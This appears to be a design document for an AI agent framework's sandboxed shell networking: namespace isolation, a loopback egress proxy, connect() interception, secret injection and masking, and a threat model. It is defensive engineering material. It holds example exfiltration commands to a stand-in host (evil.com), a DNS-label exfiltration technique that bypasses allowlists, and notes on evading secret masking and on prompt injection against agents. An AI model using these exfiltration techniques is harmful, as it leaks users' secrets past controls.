# Shell Networking: proxy variables + UDS proxy

## Design Summary

Shell children are network-isolated via `CLONE_NEWNET` (the hard boundary) and
given controlled outbound access one way only: an HTTP proxy on the sandbox's
loopback, advertised through `HTTP_PROXY` / `HTTPS_PROXY`, which forwards each
request for `host:port` over a Unix domain socket to a proxy thread in the
per-call broker. A program that honors the proxy variables reaches allowlisted
hosts by name; a program that does not has no network — unless the host has
connect() interception (kernel 5.19+), which tunnels its `connect()` through
the same proxy ([below](#connect-interception)).

Secrets reach a child two ways: the trusted parent interpolates `{{SECRET:name}}` in the tool arguments just before dispatch, and referenced secrets are also set as `CCLAW_SECRET_<NAME>` environment variables — in both cases only secrets the agent is granted (grants kind `secret`, [security.md](security.md#using-a-secret-is-a-grant)). The stored command keeps the placeholder, never the value. Output is masked before storage. See [security.md](security.md).

## Security Layers

| Layer | Mechanism | Kernel-enforced? |
|-------|-----------|-----------------|
| Network kill | `CLONE_NEWNET` — no interfaces, no routes | Yes |
| Controlled egress | `HTTP(S)_PROXY` → `net_shim` on loopback → UDS → proxy | No (app-level) |
| Filesystem | `CLONE_NEWNS` — `/` ro, workspace rw | Yes |
| Env stripping | Unset CCLAW_*, API keys before exec | No (app-level) |
| Secret injection | `CCLAW_SECRET_*` env vars (selective) | No (app-level) |
| Output masking | Replace secret values with `[REDACTED]` | No (app-level) |
| Allowlist | Proxy checks egress rules (hostname + CIDR) before connect | No (app-level) |

Key insight: `CLONE_NEWNET` is the hard boundary. The proxy variables are
plumbing, not enforcement: a program that ignores or unsets them gets zero
network, not unrestricted network.

That is network `firewalled` (and `none`, with no proxy at all) in the namespace
(`NE_NETNS`, [containment.md](containment.md)). Two plans run without a
namespace:

- **`NE_CODE`, js only**: cclaw's curl in the js child connects to the
  broker's proxy socket itself (`HttpRequestOpts.proxy_unix`, `src/http.c`:
  an already-connected unix socket handed to curl, a numeric placeholder proxy
  address so nothing is resolved in the child) and asks for each tunnel with
  `CONNECT host:port HTTP/1.1`. The proxy reads that as its preamble and
  answers in HTTP; the decision is the same `proxy_decide()`. No variables, no
  `net_shim`; under network `none` there is no socket and `http_request`
  refuses.
- **`NE_ENV`, shell under `advisory`**: the same `net_shim` listens on the
  host's loopback and the proxy variables, `CCLAW_CONNECT` and
  `GIT_SSH_COMMAND` are set (the `connect` binary is written into the agent's
  scratch dir and renamed into place). A program that honors them is decided by
  the proxy; nothing stops one that does not, and any local process can reach
  the listener during the call. That is what `advisory` promises, and no more.
- **`NE_NOTIF`, shell under `firewalled` (and `advisory` when the host has
  it)**: as `NE_ENV`, plus a seccomp filter that hands every `connect()` to
  the broker, which tunnels it through the proxy
  ([containment.md](containment.md#connect-interception)).

**Terminology: "broker" vs "proxy" are not the same scope.** "Broker" names
the whole forked per-call tool worker (`tool_shell_handler` et al.) — it sets
up the sandbox, injects secrets, drains the output pipe, *and* hosts the
egress proxy in a thread. "Proxy" / `ProxyContext` (`proxy.c`) names
specifically the egress-decision-and-relay subsystem the broker stands up for
that one call — `host_decide()`, `addr_permitted()`, `dial_ip()`, `relay()`.
The proxy is a piece the broker hosts, not a synonym for it; keep the two
words scoped that way in comments and docs so "the broker enforces X" doesn't
get misread as "the whole tool-exec worker is the firewall."

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│ Per-call broker (host netns)                                 │
│                                                              │
│   Proxy thread (proxy.c)                                     │
│   - listens on .proxy.sock                                   │
│   - reads preamble "host:port"                               │
│   - host_decide(): allowlist, SSRF filter                    │
│   - resolves DNS, dials the address it resolved, relays      │
│        ▲                                    │                │
│        │ UDS (bind-mounted into the sandbox)▼                │
│ ┌──────┴───────────────────────────┐   real network          │
│ │ Sandbox (new netns: lo only)     │                         │
│ │                                  │                         │
│ │  net_shim  127.0.0.1:<port>      │                         │
│ │     ▲  CONNECT host:port         │                         │
│ │     │  GET http://host/path      │                         │
│ │  command  (HTTPS_PROXY=…)        │                         │
│ └──────────────────────────────────┘                         │
└──────────────────────────────────────────────────────────────┘
```

The broker's socket is `<agent dir>/.proxy.<pid>.sock`, bind-mounted into the
sandbox at `/tmp/.cclaw_proxy.sock`. A deep agent dir makes that path longer
than `sun_path` (108 bytes); the broker then binds it through a descriptor for
the folder (`/proc/self/fd/<n>/.proxy.<pid>.sock`). If the socket cannot be
created at all the call is refused with the reason, never run without a
proxy.

## Connection Flow

```
shell: curl https://api.github.com/repos
  1. curl reads HTTPS_PROXY, connects to net_shim on loopback
  2. curl sends "CONNECT api.github.com:443"
  3. net_shim opens the UDS, sends preamble "api.github.com:443\n"
  4. proxy checks egress rules → allowed
  5. proxy resolves api.github.com, opens real TCP:443, answers "OK"
  6. net_shim answers "200 Connection established" and splices bytes
  7. curl does its TLS handshake directly with api.github.com
  8. curl sends the request with $CCLAW_SECRET_GITHUB_TOKEN from env

shell: curl https://evil.com/steal
  1-3. as above, preamble "evil.com:443\n"
  4. proxy checks egress rules → NOT listed, answers "DENIED"
  5. net_shim answers "403 Forbidden" with the reason in the body
  6. curl: "CONNECT tunnel failed, response 403"
  7. the broker appends "cclaw: proxy blocked host(s) not in allowlist:
     evil.com — request access via request_config …" to the tool result

anything that ignores the proxy variables: ./tool --connect evil.com
  (a host without connect() interception)
  1. connect() in a namespace with no interfaces and no routes
  2. ENETUNREACH (or a failed name lookup first: there is no DNS either)

the same, with connect() interception: nc api.github.com 443
  1. nc resolves api.github.com: the DNS stub on 127.0.0.1:53 answers
     198.18.0.1 (a name's own address for the call; nothing is looked up)
  2. nc calls connect(198.18.0.1:443); the seccomp filter hands it to the
     broker's supervisor
  3. the supervisor takes nc's socket, connects it to net_shim, sends
     "CONNECT api.github.com:443", reads "200", returns 0
  4. from here as the curl flow from step 3; a refusal is ECONNREFUSED
```

## net_shim

`src/net_shim.c`, ~300 lines, its own translation unit linking only libc: it
has no policy, resolver, secret or DB symbols, so it cannot make an egress
decision. It is embedded in the cclaw binary and started per call from a
memfd. Two modes:

- **HTTP proxy** on a loopback listener. `CONNECT host:port` tunnels any TCP
  stream — HTTPS, WebSockets, gRPC, any port — with TLS end to end between the
  program and the real server: nothing is re-signed, no CA is installed, and
  certificate pinning keeps working. A plain `GET http://host/path` is
  rewritten to origin form and forwarded as a single request
  (`Connection: close`), so `curl http://…` works without `--proxytunnel`.
- **`connect <host> <port>`** — the same tunnel on stdin/stdout, for programs
  that take a proxy *command* instead of proxy variables. The shell gets
  a copy at `/.cclaw_connect`; `GIT_SSH_COMMAND` is preset to
  `ssh -o ProxyCommand='/.cclaw_connect connect %h %p'`, so git over ssh works
  unprompted, and `$CCLAW_CONNECT` holds the command for a hand-written
  `ssh -o ProxyCommand="$CCLAW_CONNECT %h %p" host`.

A refusal is `403 Forbidden` when the broker said DENIED (policy) and
`502 Bad Gateway` when the name did not resolve or the host did not answer.
curl hides the body of a failed CONNECT, so the line the agent actually reads
is the summary the broker appends to the tool result.

**Egress rule model** (as of 2026-06): the proxy partitions per-agent grants
into two sets at `proxy_bind` time: hostname rules (exact + `.`-prefix suffix
match, case-insensitive) and CIDR rules (parsed IPv4/IPv6 CIDRs + bare literal
IPs stored as /32 or /128). A request is admitted if either set matches.
Private/metadata IPs have additional constraints — see
`specs/egress-filter.md` §4 and §6. Default-deny: no rules → no egress.

Protocol over UDS:
```
Client → Proxy: "<host>:<port>\n"        (text preamble, max 256 bytes)
Proxy → Client: "OK\n"                   (connection established)
         or     "DENIED\n"               (host not in allowlist)
         or     "ERROR <msg>\n"          (DNS failure, connect timeout, etc.)
[bidirectional byte relay after OK]
```

That preamble is the whole protocol. The decision behind it is
`proxy_decide()` (`src/proxy.c`): allowlist, then for a hostname one
resolution and the SSRF filter, and the proxy dials the address it kept. A
numeric target needs a literal-IP or CIDR grant of its own. See
[egress-filter.md](egress-filter.md).

## Coverage: what gets network inside the sandbox

One rule without connect() interception: **a program that honors
`HTTP_PROXY` / `HTTPS_PROXY` (either case) reaches allowlisted hosts;
anything else has no network.** With it (kernel 5.19+, `--doctor` says
"connect() interception yes") every TCP `connect()` is decided by the proxy
too. How the program was linked does not matter.

| Program | In the namespace | … with interception | No namespace, interception (`NE_NOTIF`) |
|---|---|---|---|
| `web_fetch`, `js_eval` (cclaw's own libcurl) | Yes | Yes | Yes |
| `curl`, `wget`, `git` over https, `pip`, `npm`, `cargo`, `apt` | Yes | Yes | Yes |
| Go tools on `net/http` (`gh`, `kubectl`, `terraform`), static or not | Yes | Yes | Yes |
| Python `requests`/`urllib`, Ruby `net/http`, most HTTP libraries | Yes | Yes | Yes |
| `git` over ssh | Yes — `GIT_SSH_COMMAND` is preset | Yes | Yes |
| `ssh` | With `-o ProxyCommand="$CCLAW_CONNECT %h %p"` | Yes | With the ProxyCommand (no DNS) |
| HTTP clients that ignore the variables (Node's built-in `fetch`, a JVM without proxy flags) | No | Yes, by name | Literal addresses only (no DNS) |
| TCP clients: `nc`, `socat`, `socket.connect()`, database clients | No | Yes, by name | Literal addresses only (no DNS) |
| The host's own loopback (`127.0.0.1:<port>`), a server the command starts itself | Its own servers only (the namespace has its own loopback) | same | `advisory`: yes, directly — the agent's dev servers and anything else listening there. `firewalled`: no — no loopback port but the proxy's, and no `listen()` |
| A unix socket on the host (`docker.sock`, a session bus) | No (not mounted) | No | `advisory`: yes, subject to file permissions. `firewalled`: only under the agent's own directories and path grants |
| UDP, ICMP (`ping`), raw sockets, DNS tools (`dig`) | No | No (the stub answers only A/AAAA through the resolver) | No: such sockets cannot be made |

The "No" cells fail safe, not open. If a tool call gets "network
unreachable" or a failed name lookup with no proxy DENIED/ERROR logged, the
program never talked to the proxy; with interception a refusal is
`ECONNREFUSED` and the proxy's note is in the tool result. Raw TCP to
arbitrary services without a grant, and UDP, are what containment `none` is
for.

### connect() interception

The shell's seccomp filter hands `connect()` to a supervisor thread in the
broker, which connects the caller's own socket to `net_shim` and performs the
`CONNECT host:port` handshake on it before returning 0 — the program keeps a
real TCP socket (non-blocking mode, `TCP_NODELAY` and `poll` behave as
usual), and the decision is the proxy's, as for any other connection. In the
namespace it is a convenience: a DNS stub on `127.0.0.1:53` (resolv.conf is
replaced in the mount namespace) hands each name an address from
`198.18.0.0/15` that the supervisor maps back to the name, so the proxy
resolves and checks the real one. Without a namespace it is the enforcer for
`firewalled`: no UDP or raw sockets, no Fast Open sends, no ptrace, and no
call is ever continued. Mechanism, refusals and limits:
[containment.md](containment.md#connect-interception). A `connect()` blocks
until the proxy has dialled the destination, even on a non-blocking socket.

### `channel_runner`: a separate process with its own, narrower control

`channel_runner.c` (the process that runs Telegram/etc. channel extensions —
JS agents can author and promote via self-augmentation) is not proxy-fronted
at all; it makes outbound HTTP directly via its own curl handles, with none
of the `net_shim` / netns machinery above. It doesn't need an
allowlist, because a channel is semantically "talks to one external service,"
not arbitrary web access — so its egress control is a single-endpoint pin
instead: `make_easy()`'s `url_host_allowed()` (in `src/channel_runner.c`)
checks every outbound URL's host against the channel's own configured
`base_url` (via `curl_url()`, exact-host-equality, fail-closed if `base_url`
is unset) before any request goes out. This is the equivalent mechanism for
this process, not an oversight — a proxy/allowlist model would be the wrong
shape for a process whose entire job is talking to one pre-known host.

## Secret Injection Model

```
cclaw.db (encrypted)
  │ decrypt at fork
  ▼
agent env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ agent reads, stores in memory, unsets from env
  │ on shell_exec: selectively re-injects needed secrets
  ▼
shell child env: CCLAW_SECRET_GITHUB_TOKEN=ghp_abc123
  │ LLM wrote: curl -H "Authorization: Bearer $CCLAW_SECRET_GITHUB_TOKEN" ...
  │ shell expands var at runtime
  │ command string in DB only contains "$CCLAW_SECRET_GITHUB_TOKEN" (safe)
  ▼
shell output: "HTTP/1.1 200 OK..."
  │ tool_result_postprocess() (single masking chokepoint, in the parent)
  │ deinterpolate: known values (raw+base64+url) → {{SECRET:github_token}}
  │ then AC scan for unknown signature-matching secrets
  ▼
entries table: masked output stored
```

LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHUB_TOKEN`, `$CCLAW_SECRET_NPM_TOKEN`. Use them in shell commands by referencing the variable name. Never write the actual value."

## Threat Model

| Threat | Mitigation |
|--------|-----------|
| Shell leaks secret via `echo $SECRET` | Output masking catches it |
| Shell exfiltrates to attacker host | Proxy denies unlisted hosts |
| Program ignores or unsets the proxy variables | CLONE_NEWNET — zero network; with interception its `connect()` goes through the proxy anyway |
| LLM puts secret value in command string | Future: command safety gate (pattern check) |
| LLM encodes secret (base64) to evade masking | Partial: mask common encodings; accepted risk |
| Shell reads filesystem secrets | CLONE_NEWNS — `/` ro, workspace has no secrets |
| Prompt injection extracts secret | LLM only knows names, not values; output masked |

### Accepted Risks

| Risk | Rationale |
|------|-----------|
| Proxy variables are advice a program may ignore | CLONE_NEWNET: ignoring them means zero network |
| Base64-encoded secrets evade masking | Low probability; egress allowlist limits damage |
| Shell child has secret in env memory | Ephemeral process; same as any CLI tool using env vars |
| Proxy sees all traffic in plaintext (TLS passthrough) | Proxy only sees encrypted bytes; no MITM |
| DNS query labels can carry exfiltrated data (`curl https://$(payload).allowed-suffix.com`) | `host_decide()`/`addr_permitted()` gate *which hostnames* may be resolved, not what's encoded in an otherwise-allowed query's label — the query itself leaves via the broker's real resolver before any connect/deny decision happens. Fundamental limit of hostname-allowlist egress filtering, not fixable within this pipeline; see `egress-filter.md` Q8 |

## History

Three designs, each simpler than the last:

1. **iptables REDIRECT** — a veth pair, netfilter rules, a MITM CA for
   credential injection. Needed host `CAP_NET_ADMIN` and `iptables-legacy`.
2. **`LD_PRELOAD` + UDS** (until v0.6.0) — `libcclaw_net.so`, preloaded into
   every program the sandboxed shell ran, intercepted libc `connect()` and
   `getaddrinfo()` and routed them to the proxy, so even proxy-unaware
   programs (ssh, raw sockets) worked. `net_shim` was added beside it for
   static binaries, which have no dynamic loader to preload into.
3. **Proxy variables only** (v0.6.1) — `net_shim` alone.

Why the preload went: it was the one piece of a static release binary that had
to match the *host's* libc. v0.6.0 shipped it built against a glibc newer than
Debian 12's and Amazon Linux 2023's, and because `ld.so` refuses to start a
program whose preloaded library it cannot satisfy, every sandboxed shell
command died, `/bin/sh` included. It also could not load on musl hosts, was
blind to static binaries (Go, musl Rust), and needed a loopback carve-out to
coexist with the proxy-variable path. What it added over the variables was
ssh and raw sockets; ssh is covered by `connect` mode. The proxy's `RESOLVE`
request and its per-address "bless" set, which existed only so the library
could resolve first and connect by number second, were removed in v0.6.2.

## Implementation Status (all shipped)

- In-sandbox proxy helper (`src/net_shim.c`), started by `contain_linux.c`
- connect() interception and the DNS stub (`src/contain_linux_notif.c`)
- Egress decision + relay in the broker (`src/proxy.c`)
- Secret env-var injection for shell children
- Output secret masking (DLP scanner, see specs/security.md)
- Integration tests (`test/test_integration_shell_proxy*.c`,
  `test/test_integration_shell_static.c`)

## Non-Goals

- No TLS interception / MITM CA (secrets via env vars instead)
- No credential_mappings table (secrets are env vars, not proxy-injected headers)
- No code loaded into the host's programs (`LD_PRELOAD`)
- No iptables / netfilter rules
- No veth pairs or cross-namespace network plumbing
